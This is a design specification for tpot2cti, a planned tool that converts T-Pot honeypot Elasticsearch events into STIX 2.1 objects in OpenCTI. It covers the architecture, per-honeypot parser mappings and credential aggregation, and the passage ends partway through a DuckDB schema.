# tpot2cti — v1.0 Specification

**Project:** `tpot2cti`
**Status:** Specification (no code yet)
**License:** AGPLv3
**Target ship date:** TBD
**Document version:** 1.0 draft (2026-05-21)

This document is the authoritative specification for tpot2cti v1.0.
Implementation work derives from this; ambiguity gets resolved here
first, then the code follows. If you're a contributor reading this,
this is what we're building.

---

## 1. Purpose & non-goals

### Purpose

tpot2cti is a STIX 2.1 importer that bridges the gap between
**T-Pot honeypot data** and **OpenCTI**. It runs on an operator's
own infrastructure, connects to a user-supplied T-Pot installation
over SSH, reads the honeypot's Elasticsearch indices, and emits a
rich entity-relationship graph into a self-hosted OpenCTI instance.

The intent is to make T-Pot operators' data:
- **Queryable** as a graph rather than as flat ES documents
- **Shareable** in STIX 2.1 with sector ISACs, peers, MISP instances
- **Correlatable** across sensors, sessions, attackers, malware
- **A foundation** for future enrichment plug-ins (threat intel,
  reputation, classification) without forcing those choices upfront

### For

- Independent T-Pot operators who want analyst-friendly threat-intel UX
- Security researchers correlating across multiple honeypot deployments
- Sector ISAC / ISAO contributors who want STIX-formatted intel ready to share
- Teams who already run OpenCTI and want T-Pot data inside it

### Non-goals

- **Not** a fork or repackaging of OpenCTI. We deploy OpenCTI from its
  upstream Docker repository (`OpenCTI-Platform/docker`) verbatim. Our
  project bolts onto that base install via a shared Docker network. We
  follow OpenCTI's release cadence; their breaking changes are our
  problem to track, not theirs to coordinate with us.
- **Not** a T-Pot replacement. T-Pot deployment, sensor configuration,
  persona customization, iptables hardening, etc. are entirely the
  user's responsibility. We never touch the T-Pot box except over SSH.
- **Not** a malware analysis platform. We extract SHA-256s into
  `StixFile` observables but do no classification, no sandboxing, no
  YARA matching, no behavioral analysis. Future enrichment connectors
  can layer those features in.
- **Not** a threat-intel aggregator. We don't fetch GeoIP from MaxMind,
  reputation from AbuseIPDB, or anything else from the internet. We
  use what T-Pot's own logstash has already enriched and stop there.
- **Not** persona-aware. Whatever T-Pot's ES has, we faithfully
  represent. We don't try to detect that a sensor is "the medical
  persona" and treat it specially.
- **Not** a multi-tenant SaaS. One deployment = one T-Pot source.

---

## 2. Architecture

### System topology — two compose stacks, one Docker network

The OpenCTI stack and the tpot2cti stack are deployed as **two separate
Docker Compose projects** on the same host. They communicate through a
shared Docker network created by OpenCTI. tpot2cti's compose attaches
to that network as an `external` reference.

```
                  Internet (or LAN)
                          │
        ┌─────────────────┴────────────────────────┐
        │                                          │
   ┌────▼────────────────────┐    ┌────────────────▼──────────────────────┐
   │ T-Pot 24.04             │    │ tpot2cti host                         │
   │ (user's responsibility) │    │ (4c / 16-32G RAM / 128G disk)         │
   │                         │    │ Ubuntu 22.04 or 24.04                 │
   │ - Elasticsearch :64298  │    │                                       │
   │ - SSH         :64295    │◄───┤                                       │
   │ - Kibana      :64297    │    │  ┌─────────────────────────────────┐  │
   │                         │    │  │ Compose project: opencti        │  │
   └─────────────────────────┘    │  │ (cloned from upstream:          │  │
                                  │  │  OpenCTI-Platform/docker)       │  │
                                  │  │                                 │  │
                                  │  │  - elasticsearch                │  │
                                  │  │  - redis                        │  │
                                  │  │  - rabbitmq                     │  │
                                  │  │  - minio                        │  │
                                  │  │  - opencti app + workers        │  │
                                  │  │  - opencti built-in connectors  │  │
                                  │  │                                 │  │
                                  │  │  Network: opencti_default       │  │
                                  │  │  (created by this compose)      │  │
                                  │  └─────────────────────────────────┘  │
                                  │                                       │
                                  │  ┌─────────────────────────────────┐  │
                                  │  │ Compose project: tpot2cti       │  │
                                  │  │ (our repo's compose file)       │  │
                                  │  │                                 │  │
                                  │  │  - tpot-tunnel (autossh)        │  │
                                  │  │  - tpot2cti (importer)          │  │
                                  │  │  - tpot2cti-credentials (opt)   │  │
                                  │  │  - tpot2cti-vault (opt)         │  │
                                  │  │                                 │  │
                                  │  │  Network: opencti_default       │  │
                                  │  │  (attached as external)         │  │
                                  │  └─────────────────────────────────┘  │
                                  └───────────────────────────────────────┘
```

Our containers reach OpenCTI's services by their compose-defined names:
`http://opencti:8080`, `amqp://rabbitmq:5672`, etc.

### Why this separation

| Reason | Detail |
|---|---|
| **Don't fork OpenCTI's compose.** | We'd lag behind their releases and have to merge their changes constantly. By cloning their repo, we always get exactly what upstream ships. |
| **Independent upgrade cadence.** | User updates OpenCTI by `git pull` in `opencti/`. Updates tpot2cti by `git pull` in our repo. Neither is coupled to the other. |
| **Clear fault domains.** | When something breaks, "is OpenCTI up by itself?" is one quick test. |
| **Smaller maintenance burden.** | Our repo doesn't have ES tuning, RabbitMQ config, MinIO settings, etc. — that's all OpenCTI's responsibility. |
| **OpenCTI ecosystem compatibility.** | Anything that integrates with the standard OpenCTI install (their other connectors, exporters, etc.) just works alongside us. |

### Data flow

```
T-Pot ES → ssh tunnel → tpot2cti → OpenCTI graph
                                      │
                                      └─→ analyst UI
                                      └─→ STIX export → ISAC partners
                                      └─→ MISP (via STIX2 bridge)
```

### What ships in OUR repo

```
tpot2cti/                        ← what users `git clone`
├── README.md
├── LICENSE                      ← AGPLv3
├── setup.sh                     ← orchestrator: clones OpenCTI repo, gens secrets, brings up both stacks
├── teardown.sh                  ← stops both stacks cleanly
├── update.sh                    ← updates both projects (optionally re-pinning OpenCTI version)
├── docker-compose.yml           ← OUR services only (tunnel + tpot2cti + optionals)
├── .env.example                 ← OUR vars only
├── .env                         ← generated by setup.sh (gitignored)
├── ssh-keys/                    ← generated by setup.sh (gitignored)
├── data/                        ← per-connector state (gitignored)
│   ├── tpot2cti/                ← core importer state
│   ├── credentials/             ← DuckDB if enabled
│   └── malware-vault/           ← samples if enabled
├── logs/                        ← rotated log files (gitignored)
├── tpot2cti/                    ← importer container source
├── tpot2cti-credentials/        ← optional connector source
├── tpot2cti-vault/              ← optional connector source
└── docs/
```

### What `setup.sh` creates alongside our repo

```
opencti/                         ← cloned from OpenCTI-Platform/docker by setup.sh
├── docker-compose.yml           ← upstream's compose (we don't modify)
├── .env.sample                  ← upstream's template
├── .env                         ← populated by setup.sh from their template
└── ... (everything else upstream ships)
```

The user's tree after `setup.sh` runs looks like:

```
~/
├── tpot2cti/                    ← our repo (cloned by user)
└── opencti/                     ← OpenCTI's repo (cloned by setup.sh)
```

The two directories are siblings. `setup.sh` puts `opencti/` next to
itself (`./opencti/` from inside `tpot2cti/`) for predictability —
documented and configurable via env var if a user prefers a different
location.

### OpenCTI version pinning

`setup.sh` checks out a **specific tested OpenCTI git tag** when cloning
their repo. The tag is hardcoded in `setup.sh` as `OPENCTI_VERSION`.

| tpot2cti version | OpenCTI tag we pin to |
|---|---|
| 1.0.x | (to be selected — likely the latest stable 6.x at ship time) |

This is the **only** OpenCTI version we guarantee compatibility with
for a given tpot2cti release. Users wanting a different OpenCTI
version are on their own (community-supportable, not maintainer-
guaranteed). Each tpot2cti release tests against and documents one
OpenCTI version.

When a new OpenCTI version comes out:
1. We test tpot2cti against it
2. Fix anything that broke (their .env shape, connector ID formats, etc.)
3. Bump `OPENCTI_VERSION` in `setup.sh`
4. Release tpot2cti v1.0.x+1 with the new pin documented

### Use upstream `.env.sample`, do NOT vendor a copy

`setup.sh` reads `opencti/.env.sample` (from the freshly-cloned
upstream repo) as the authoritative template. We don't ship a vendored
copy of OpenCTI's env template. If upstream adds a required env var,
their `.env.sample` has it, and our setup script handles whatever's
there.

If they remove a var we depend on, our setup logic that fills the
template breaks, the install fails with a clear error, and we ship a
fix. This is the right trade-off — stay aligned with upstream rather
than perpetually playing catch-up to vendored copies.

---

## 3. Core importer behavior

### Cycle

The core `tpot2cti` container runs a continuous loop:

```
┌──────────────────────────────────────────────────────┐
│ tpot2cti main loop                                   │
│                                                      │
│ every PT15M (configurable via TPOT2CTI_INTERVAL):    │
│                                                      │
│   1. Query T-Pot ES for events since last_run        │
│      - via logstash-* index pattern                  │
│      - filtered by @timestamp range                  │
│      - paginated with search_after / scroll          │
│                                                      │
│   2. Dispatch each doc to the right parser           │
│      - by `type` field (Cowrie, Suricata, ConPot...) │
│      - unrecognized types → fallback parser          │
│      - skipped types (e.g. P0f, if user wants):     │
│        configurable via .env TPOT2CTI_IGNORE_TYPES   │
│                                                      │
│   3. Correlate events into sessions                  │
│      - Group by (session_id, sensor) for protocols   │
│        that have sessions (Cowrie, Heralding, ...)   │
│      - One-event-per-session for protocols without   │
│        (Suricata alerts, single ConPot probes)       │
│                                                      │
│   4. Build STIX SDOs and relationships               │
│      - Deterministic UUID5 IDs                       │
│      - One bundle per cycle                          │
│      - Three-pass send: foundation, entities, rels   │
│      - 30-second indexing delays between passes      │
│                                                      │
│   5. Update state                                    │
│      - last_run = end of cycle window                │
│      - written to local state DB                     │
│                                                      │
│   6. Log cycle summary                               │
│      - Counts per honeypot type                      │
│      - Counts per STIX type                          │
│      - Errors, retries                               │
└──────────────────────────────────────────────────────┘
```

### Initial run

By default, **the first cycle starts ingesting from "now"** —
no backfill of historical T-Pot data. This is the v1.0 default.

A user who wants to backfill can set `TPOT2CTI_INITIAL_LOOKBACK_HOURS`
to a positive integer (e.g. `168` for 7 days). The first cycle then
queries from `now - lookback` to `now`. Subsequent cycles use the
stored `last_run`. This is opt-in to avoid a large unexpected import
on first install.

### Three-pass bundle send

Each cycle produces one logical STIX bundle. We split it into three
ordered sub-bundles to avoid OpenCTI's `MISSING_REFERENCE_ERROR` (its
ES is eventually consistent):

1. **Foundation** — Identity, Marking-Definition, AttackPattern, Location,
   Autonomous-System. The "always referenced" things.
2. **Wait 30s** — give OpenCTI's ES time to index foundation.
3. **Entities** — IPv4-Addr, StixFile, URL, Domain-Name, Process,
   Cryptographic-Key, Indicator, Note.
4. **Wait 30s** — entities indexed.
5. **Relationships** — Relationship, Sighting. Reference everything above.

Total minimum cycle time: ~70 seconds with no events; can stretch to
several minutes for high-volume cycles.

### Sync-only HTTP

Per `LESSONS_LEARNED §1` from the predecessor platform: we use
`requests` for all HTTP, never asyncio. pycti's RabbitMQ callbacks
fire from a thread pool that breaks aiohttp's event loop.

### Logging

- stdout + rotated file at `/var/log/tpot2cti/tpot2cti.log`
- JSON-structured logs (one event per line) so users can pipe them
  into their own log aggregation if they want
- Default level INFO; configurable via `LOG_LEVEL=DEBUG`

### Health endpoint

The container exposes `/health` on internal port 8080 returning:
- HTTP 200 if last cycle completed successfully
- HTTP 503 if no cycle has succeeded in the last 2× cycle interval

Docker compose healthcheck uses this.

---

## 4. STIX object model

### Object inventory

| STIX type | Emitted when | Key fields |
|---|---|---|
| `identity` (operator) | One per deployment, on startup | name from `OPERATOR_ORG_NAME` env |
| `identity` (sensor) | One per unique `t-pot_hostname` | name = the hostname |
| `marking-definition` | TLP applied to every emitted object | TLP from env (default `AMBER+STRICT`) |
| `attack-pattern` | Foundational set + parser-derived | name + (where applicable) ATT&CK technique ref |
| `location` | One per unique country (+ city if available) | from T-Pot's `geoip.country_iso_code`, `geoip.city_name` |
| `autonomous-system` | One per unique ASN | from T-Pot's `geoip.asn`, `geoip.organization` |
| `ipv4-addr` | One per unique `src_ip` | the attacker |
| `stixfile` | One per unique `sha256` of captured malware | hash only — no bytes in core |
| `url` | URLs extracted from Cowrie commands, HTTP req/res, etc. | full URL |
| `domain-name` | Domains in SNI, HTTP host, URL hostnames | apex + subdomain |
| `process` | One per distinct command TRANSCRIPT, shared across the sessions that ran it | `command_line` = canonical joined commands |
| `cryptographic-key` | Per HASSH, JA3, JA3S, HTTP-header-hash | fingerprint value |
| `indicator` | Per high-confidence pattern (file hash, URL, IP) | STIX pattern syntax |
| `note` | Session summary + daily aggregates | markdown body |
| `relationship` | Connects all of the above | `relationship_type` + source/target |
| `sighting` | Per session | target = Indicator, where = sensor Identity |

### Deterministic STIX IDs

Every emitted SDO uses a UUID5-based ID for idempotency:

```python
NS_DNS = uuid.UUID("6ba7b810-9dad-11d1-80b4-00c04fd430c8")

def sdo_id(stix_type, *seed_parts):
    seed = ":".join(str(p) for p in seed_parts)
    return f"{stix_type}--{uuid.uuid5(NS_DNS, seed)}"
```

Seed examples:
| SDO | Seed |
|---|---|
| `identity` (operator) | `identity:operator:<org_name>` |
| `identity` (sensor) | `identity:sensor:<hostname>` |
| `ipv4-addr` | `ipv4-addr:<ipv4>` |
| `stixfile` | `stixfile:sha256:<sha256>` |
| `url` | `url:<full-url>` |
| `domain-name` | `domain-name:<fqdn>` |
| `process` | `process:<canonical command_line>` (content-addressed) |
| `cryptographic-key` | `cryptographic-key:<value>` |
| `location` (country) | `location:country:<iso2>` |
| `location` (city) | `location:city:<iso2>:<city>` |
| `autonomous-system` | `autonomous-system:<asn>` |
| `note` (session) | `note:session:<sensor>:<session_id>` |
| `note` (daily creds) | `note:daily-creds:<sensor>:<utc-date>` |
| `attack-pattern` | `attack-pattern:<name>` |
| `indicator` (file) | `indicator:file:sha256:<sha256>` |
| `sighting` | `sighting:<sensor>:<session_id>` |

The namespace constant **MUST NOT change** between releases. If it
ever does, every previously-emitted SDO becomes orphaned in OpenCTI.

### The session graph (per Cowrie session — the richest example)

```
Identity(operator)
   │ created-by
   ▼
Identity(sensor)─────────┐
   │ created-by          │ object-marking
   ▼                     ▼
┌──────────────┐    Marking-Definition(TLP:AMBER+STRICT)
│ IPv4-Addr    │
│ (attacker)   │────located-at────► Location(country)
└──┬───────────┘
   │ originates-from
   ▼
Autonomous-System
   │
   │ (back to IPv4-Addr)
   ▼
┌─────────────────────────────────────┐
│ Sighting                            │
│  target: Indicator(ip_pattern)      │
│  where:  Identity(sensor)           │
│  first_seen / last_seen / count     │
└─────────────────────────────────────┘
   │ (session details)
   ▼
┌──────────────────┐  ┌────────────────────────┐
│ Process          │  │ Cryptographic-Key      │
│ (commands run)   │  │ (HASSH client sig)     │
└──┬───────────────┘  └────────────────────────┘
   │ related-to                  ▲
   ▼                             │ related-to
┌──────────────────┐             │
│ URL              │─────────────┤
│ (from wget cmd)  │             │
└──┬───────────────┘             │
   │ related-to                  │
   ▼                             │
┌──────────────────┐             │
│ StixFile         │─────────────┘
│ (downloaded.bin) │
└──┬───────────────┘
   │ as Indicator
   ▼
┌──────────────────┐
│ Indicator        │──indicates──► AttackPattern(malware-delivery)
│ pattern: file    │
│ hashes.SHA-256   │
└──────────────────┘
```

### Provenance & TLP

- Every emitted SDO has `created_by_ref` pointing at the operator's
  `Identity`. The sensor `Identity` is a separate concept — used as
  the "where" in Sightings, not as creator.
- Every emitted SDO has `object_marking_refs` referencing the default
  TLP marking. Default is `TLP:AMBER+STRICT`; configurable per
  deployment via `TPOT2CTI_DEFAULT_TLP` env var.
- When a user wants to share specific entities at lower TLP, they
  relax markings via OpenCTI's UI on a per-object basis. We never
  override.

### Confidence

- All emitted SDOs have `confidence: 75` by default. This reflects
  "honeypot-derived, automated, single-source." Higher confidence is
  appropriate for enrichment-confirmed data (future connectors).
- Configurable via `TPOT2CTI_DEFAULT_CONFIDENCE`.

---

## 5. Per-parser specifications

Each parser is a Python module under `tpot2cti/src/parsers/`. The
parser interface:

```python
class BaseParser:
    type_name: str  # value of T-Pot's `type` field this parser handles

    def parse(self, doc: dict) -> ParsedEvent | None:
        """Convert a T-Pot ES doc into a normalized internal event.
        Return None to skip the doc (e.g. malformed)."""
        ...

    def has_substance(self, event: ParsedEvent) -> bool:
        """Whether to emit STIX for this event. Default True; parsers
        can suppress (e.g. low-noise TCP probes)."""
        ...
```

> **SUPERSEDED:** `has_substance()` was specified per-parser but was never
> wired into the cycle loop, so it was removed. The single drive-by-vs-full
> -graph emission gate lives in the orchestrator as `_is_bare_scan()`
> (`tpot2cti/main.py`), applied only to the generic scan paths (Honeytrap /
> fallback / default drive-by). Parsers now implement `parse()` and,
> optionally, `correlate()` only.

Parsers below are listed in priority order (highest-value first).

### 5.1 Cowrie (`type:"Cowrie"`)

The richest parser — covers SSH and Telnet sessions on ports 22, 23, 2222.

**T-Pot doc fields used:**
- `session` — unique session ID
- `src_ip`, `src_port`, `dst_ip`, `dst_port`
- `eventid` — Cowrie event subtype (`cowrie.session.connect`, `cowrie.login.success`, `cowrie.command.input`, `cowrie.session.file_download`, etc.)
- `username`, `password` — credential attempts
- `input` — command text
- `shasum` / `sha256` — downloaded file hash
- `url` — file download source URL
- `version` — SSH client version
- `hassh` — HASSH client fingerprint
- `kex_algs` — SSH key exchange algorithms
- `duration`

**Session correlation:** events grouped by `session` field. One STIX
Sighting per session.

**STIX emitted per session:**
- `IPv4-Addr` (the `src_ip`)
- `AutonomousSystem` and `Location` (from geoip fields if present)
- `Cryptographic-Key` for the HASSH fingerprint (if present)
- `Process` with `command_line` = newline-joined `cowrie.command.input` events
- `StixFile` for every `cowrie.session.file_download` (sha256-keyed)
- `URL` for download sources, plus URLs extracted from command text via regex
- `Domain-Name` for hostnames in URLs
- `Note` summarizing the session (markdown body with commands, downloads, creds tried)
- `Indicator` for any captured file hash, URL, or the attacker IP
- `Sighting` linking the Indicator to the sensor

**Relationships:**
- `IPv4-Addr` → `located-at` → `Location`
- `IPv4-Addr` → `originates-from` → `AutonomousSystem`
- `Process` → `related-to` → `IPv4-Addr`
- `StixFile` → `related-to` → `IPv4-Addr`
- `URL` → `related-to` → `Process` (the command that referenced it)
- `URL` → `related-to` → `StixFile` (if the URL was a download source)
- `Cryptographic-Key` → `related-to` → `IPv4-Addr`
- `Indicator(file)` → `based-on` → `StixFile`
- `Indicator(file)` → `indicates` → `AttackPattern("malware-delivery")`
- `Sighting(target=Indicator, where=sensor Identity)`

**Substance filter:** Cowrie sessions with no commands, no downloads,
and no successful login are emitted as a Sighting only (no Note,
Process, etc.). Pure probe-and-leave noise gets one-line representation
rather than full SDO graph.

### 5.2 Suricata (`type:"Suricata"`)

Network-level IDS alerts.

**T-Pot doc fields used:**
- `src_ip`, `dest_ip`, `src_port`, `dest_port`, `proto`
- `alert.signature` — the rule that fired
- `alert.signature_id` — Suricata SID
- `alert.category`, `alert.severity`
- `alert.metadata.mitre_*` if present (ATT&CK mapping from rule)
- `flow_id` — for grouping multi-packet flows
- `payload_printable`, `hostname`, `http.*`, `tls.*` — protocol metadata

**Event correlation:** each alert is a discrete event. We do
**not** group by `flow_id` — each Suricata alert gets its own
Sighting. Multiple alerts on the same flow each appear independently.

**STIX emitted per alert:**
- `IPv4-Addr` (the `src_ip`)
- `AutonomousSystem`, `Location` (from geoip)
- `Indicator` with pattern based on the alert signature and source IP
- `Sighting` linking Indicator to sensor
- `Domain-Name` (if TLS SNI or HTTP host header present)
- `URL` (if HTTP request URL captured)
- `AttackPattern` matching the alert's ATT&CK metadata (if present in `alert.metadata.mitre_*`)

**Relationships:**
- `Indicator` → `indicates` → `AttackPattern` (from metadata, or generic "network-attack" if none)
- `Domain-Name` → `resolves-to` → `IPv4-Addr` (if SNI matches IP)
- `IPv4-Addr` → `located-at` → `Location`

### 5.3 Dionaea (`type:"Dionaea"`)

Catches binaries dropped via SMB, FTP, HTTP, MS-SQL, MySQL, etc.

**T-Pot doc fields used:**
- `src_ip`, `dst_port`, `protocol`
- `sha256`, `md5`, `sha1`, `size_bytes`
- `download_url` (if applicable)
- `connection_protocol` (smbd, ftpd, etc.)

**STIX emitted:**
- `IPv4-Addr`
- `StixFile` (with all available hashes)
- `URL` (if `download_url` present)
- `Indicator(file)`
- `Sighting`

**Relationships:** same as Cowrie file paths.

### 5.4 Honeytrap (`type:"Honeytrap"`)

TCP/UDP catchall — captures anything that hits a non-honeypotted port.

**T-Pot doc fields used:**
- `src_ip`, `dst_port`, `proto`
- `payload_hex`, `payload_printable` — what the attacker sent
- `attack_connection` metadata

**Event correlation:** each TCP connection or UDP datagram is one event.

**STIX emitted:**
- `IPv4-Addr`
- `Sighting` (probe of port N)
- `Note` if payload is non-trivial (more than 8 bytes printable)

**Substance filter:** empty-payload probes get a minimal Sighting only.

### 5.5 Heralding (`type:"Heralding"`)

Multi-protocol credential capture (SSH, Telnet, FTP, POP3, IMAP, SMTP, etc.).

**T-Pot doc fields used:**
- `src_ip`, `dst_port`, `protocol`
- `username`, `password`
- `session_id`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- Credential pair logged but NOT as `User-Account` observable (per spec —
  see §6 for the daily aggregate Note pattern)

### 5.6 ConPot (`type:"ConPot"`)

ICS/SCADA protocol probes.

**T-Pot doc fields used:**
- `src_ip`, `dst_port`, `protocol` (modbus, s7comm, iec104, ipmi, etc.)
- `request` (varies by protocol)

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `Note` with the protocol-specific request details (function code, register read, etc.)
- `AttackPattern("industrial-protocol-recon")` linked via Indicator

**Relationships:**
- `Indicator` → `indicates` → `AttackPattern`

### 5.7 H0neytr4p (`type:"H0neytr4p"`)

HTTP/HTTPS web app honeypot.

**T-Pot doc fields used:**
- `src_ip`, `request.method`, `request.uri`, `request.body`, `request.user_agent`
- `host_header`

**STIX emitted:**
- `IPv4-Addr`
- `URL` (full URI requested)
- `Domain-Name` (host header)
- `Sighting`
- `Note` with method + body if non-trivial
- `AttackPattern("web-application-attack")` if request body contains
  exploit signatures

### 5.8 Dicompot (`type:"Dicompot"`)

DICOM medical imaging protocol (port 11112).

**T-Pot doc fields used:**
- `src_ip`, `aet_called`, `aet_calling`, `command_type`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `Note` with DICOM command details (C-STORE, C-FIND, etc.)
- `AttackPattern("medical-imaging-probe")` via Indicator

### 5.9 Medpot (`type:"Medpot"`)

HL7 medical messaging protocol.

**T-Pot doc fields used:**
- `src_ip`, `dst_port`, `msg_type`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `Note` with HL7 message type

### 5.10 Mailoney (`type:"Mailoney"`)

Fake SMTP server — captures spam-relay probing.

**T-Pot doc fields used:**
- `src_ip`, `commands` (SMTP verbs), `data` (message body)
- `auth_*` (credential attempts)

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- Credential pair logged (same path as Heralding)

### 5.11 ElasticPot (`type:"ElasticPot"`)

Fake Elasticsearch — captures ES API exploitation attempts.

**T-Pot doc fields used:**
- `src_ip`, `request_url`, `request_method`, `request_body`

**STIX emitted:**
- `IPv4-Addr`
- `URL`
- `Sighting`
- `AttackPattern("api-exploitation")` if body contains CVE-2014-3120
  or similar known ES exploit patterns

### 5.12 RedisHoneypot (`type:"Redishoneypot"`)

Fake Redis — captures Redis-API probing.

**T-Pot doc fields used:**
- `src_ip`, `commands_received`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `Note` with attempted commands (e.g. CONFIG SET dir, SLAVEOF, etc.)

### 5.13 CiscoASA (`type:"Ciscoasa"`)

Cisco ASA emulator — captures CVE-2018-0101 and similar exploits.

**T-Pot doc fields used:**
- `src_ip`, `payload`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `AttackPattern("cve-2018-0101")` if payload matches

### 5.14 ADBhoney (`type:"Adbhoney"`)

Android Debug Bridge honeypot.

**T-Pot doc fields used:**
- `src_ip`, `command`, `data_sha256`

**STIX emitted:**
- `IPv4-Addr`
- `StixFile` (if data captured)
- `Sighting`
- `AttackPattern("android-adb-abuse")` via Indicator

### 5.15 IppHoney (`type:"Ipphoney"`)

IPP printing protocol honeypot.

**T-Pot doc fields used:**
- `src_ip`, `request_attributes`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`

### 5.16 Miniprint (`type:"Miniprint"`)

Mini printer honeypot.

**T-Pot doc fields used:**
- `src_ip`, `request_path`, `request_body`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`

### 5.17 Tanner (`type:"Tanner"`)

SNARE/TANNER web honeypot — emulates vulnerable web apps.

**T-Pot doc fields used:**
- `src_ip`, `url`, `attack_type` (sqli, rfi, xss, etc.)

**STIX emitted:**
- `IPv4-Addr`
- `URL`
- `Sighting`
- `AttackPattern` matching `attack_type` (e.g. `T1190` for sqli)

### 5.18 Wordpot (`type:"Wordpot"`)

Fake WordPress.

**T-Pot doc fields used:**
- `src_ip`, `request_path`, `user_agent`

**STIX emitted:**
- `IPv4-Addr`
- `URL`
- `Sighting`
- `AttackPattern("wordpress-recon")` if hits `/wp-admin`, `/wp-login.php`, etc.

### 5.19 SentryPeer (`type:"Sentrypeer"`)

SIP / VoIP honeypot.

**T-Pot doc fields used:**
- `src_ip`, `sip_method`, `called_number`, `caller`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `Note` with SIP method + called number (toll-fraud target)

### 5.20 Fatt (`type:"Fatt"`)

Passive fingerprinting — extracts JA3, JA3S, HASSH from network traffic.

**T-Pot doc fields used:**
- `src_ip`, `dst_ip`, `dst_port`
- `fatt.ja3`, `fatt.ja3s`, `fatt.hassh`, `fatt.hasshServer`
- `fatt.tlsClient`, `fatt.tlsServer`

**STIX emitted:**
- `IPv4-Addr`
- `Cryptographic-Key` per unique fingerprint (JA3, JA3S, HASSH, etc.)
- `Sighting`

**Relationships:**
- `Cryptographic-Key` → `related-to` → `IPv4-Addr`

### 5.21 Nginx (`type:"NGINX"`)

Custom nginx access logs (from persona-specific HTTP fronts).

**T-Pot doc fields used:**
- `src_ip`, `request_uri`, `request_method`, `status_code`, `user_agent`

**STIX emitted:**
- `IPv4-Addr`
- `URL`
- `Sighting`

### 5.22 Honeyaml (`type:"Honeyaml"`)

YAML / IaC config probes.

**T-Pot doc fields used:**
- `src_ip`, `request_path`, `request_body`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `Note` with attempted config paths

### 5.23 Router (`type:"Router"` or similar)

Honeypot-router emulator (Telnet console access attempts).

**T-Pot doc fields used:**
- `src_ip`, `commands`

**STIX emitted:**
- `IPv4-Addr`
- `Sighting`
- `Process` (joined commands) if any commands run

### 5.24 Fallback parser

For any `type` value not covered above. Ensures **zero data gaps**.

**T-Pot doc fields used:**
- `src_ip` (if present)
- `dst_port` (if present)
- `t-pot_hostname` (sensor)
- `@timestamp`
- `type` (recorded in the Note)

**STIX emitted:**
- `IPv4-Addr` (if `src_ip` present)
- `Sighting`
- `Note` containing the raw `type` field + the doc's `_source` JSON
  (or a truncated version)

This guarantees that even unknown T-Pot honeypot types contribute
**something** to OpenCTI. The Note's content lets analysts inspect
what was captured and a maintainer can prioritize adding a dedicated
parser if the type is high-value.

The fallback parser also emits a `WARNING` log line on every
unrecognized type so operators see "T-Pot has a new honeypot type
`<type>` — consider opening an issue for a dedicated parser."

---

## 6. Credentials handling (in core importer)

Credentials from Cowrie / Heralding / Mailoney / etc. are NOT emitted
as `User-Account` STIX observables. Honeypot-volume cred attempts
would flood OpenCTI with low-value observables. Instead, the core
importer aggregates them daily.

### Daily top-100 credentials Note

Once per UTC day (computed during the cycle that crosses midnight),
the importer emits one `Note` per sensor per day with the top 100
credentials attempted:

**Note id:** `note:daily-creds:<sensor>:<utc-date>` (UUID5)
**Note title:** `Top 100 credential attempts — 2026-05-21 (UTC) — sensor: <hostname>`
**Note body:**

```markdown
## Top 100 credential attempts — 2026-05-21 (UTC) — sensor: tpot01

**Total login attempts:** 152,341
**Unique source IPs:** 47,283
**Unique credential pairs:** 12,508

| # | Username | Password | Attempts | Unique srcs |
|---|----------|----------|----------|-------------|
| 1 | root     | 123456   | 8,491    | 312         |
| 2 | admin    | admin    | 7,203    | 245         |
| 3 | ...      | ...      | ...      | ...         |
```

**Relationships:**
- `Note` → `object` → `Identity(sensor)` (so the sensor's page shows it)

The Note is overwritten (same UUID5) if the cycle runs again for the
same UTC day — common at deployment startup. This is idempotent.

Users wanting deeper credential analytics enable the optional
`tpot2cti-credentials` connector (see §8).

---

## 7. STIX validation & error handling

### Validation

Before sending any bundle to OpenCTI, the connector validates:
- Every SDO has a valid STIX 2.1 `type`
- Every SDO has a deterministic `id`
- Every Relationship `source_ref` and `target_ref` exists in the bundle
  OR is a foundation entity already known to be in OpenCTI
- No object exceeds STIX size limits (e.g. Note body < 1MB)

Failed validation = drop the offending SDO, log a WARNING, continue.
**Never block a cycle on one bad doc.**

### Error handling

| Error class | Handling |
|---|---|
| `MISSING_REFERENCE_ERROR` from OpenCTI | Indicates the 30s indexing delay was insufficient — log + retry the relationships bundle once after 30s more. If still failing, log and continue (relationship lost for that cycle; next cycle re-emits) |
| RabbitMQ connection drop | Retry up to 3 times with 5s backoff. If persistent, log ERROR and exit cycle. Container restart policy brings us back. |
| T-Pot ES query timeout | Retry once. If still timeout, log + skip the cycle. |
| SSH tunnel drop | autossh container handles reconnection; we just retry the ES query |
| Parser exception on a single doc | Caught + logged at DEBUG; doc is skipped; cycle continues |

### Audit doc (lightweight)

Per cycle, write one audit doc to a local file `data/cycles.jsonl`:

```json
{
  "timestamp": "...",
  "duration_seconds": 18.4,
  "events_read": 12503,
  "events_parsed": 12489,
  "events_dropped": 14,
  "sdos_emitted": 47823,
  "sdos_by_type": {"ipv4-addr": 187, "stixfile": 12, ...},
  "errors_count": 0,
  "errors_sample": []
}
```

Last 30 days kept; older entries rotated out. This is much lighter
than the predecessor platform's `tsec-pipeline-audit-*` ES index
(which required a separate ES + tooling to read). For OSS users, a
local jsonl file is enough; advanced users can ship it to their own
log aggregator.

---

## 8. Optional connectors

### 8.1 tpot2cti-credentials

**Purpose:** DuckDB-backed credential analytics for offline queries.

**Activation:** docker-compose profile `credentials`.

**Behavior:** runs on its own cycle (default `PT60M` — credentials
update slowly). Reads the same T-Pot ES through the same tunnel.
Extracts every `(username, password, sensor, src_ip, timestamp)`
tuple from Cowrie / Heralding / Mailoney / SentryPeer events. Writes
to a DuckDB file at `data/credentials/credentials.duckdb`.

**Schema:**

```sql
CREATE TABLE credentials (
    username             VARCHAR,
    password             VARCHAR,
    sensor               VARCHAR,
    first_seen           TIMESTAMP,
    last_seen            TIMESTAMP,
    attempt_count        BIGINT,
    unique_src_ip_count  BIGINT,
    PRIMARY KEY (username, password, sensor)
);

CREATE TABLE credential_sources (
    username     VARCHAR,
    password     VARCHAR,
